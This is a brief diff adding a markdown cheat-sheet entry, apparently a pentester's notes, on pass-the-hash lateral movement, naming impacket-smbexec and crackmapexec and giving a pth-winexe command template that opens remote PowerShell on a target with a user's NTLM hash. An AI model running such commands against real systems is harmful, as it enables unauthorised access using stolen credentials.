@@ -1,0 +1,8 @@
+---
+tags: [hash, ntlm, pivoting]
+---
+# Using NTLM Hash
+impacket-smbexec
+crackmapexec 
+
+pth-winexe -U <user>%'<HASH>' //<TargetIp> powershell.exe
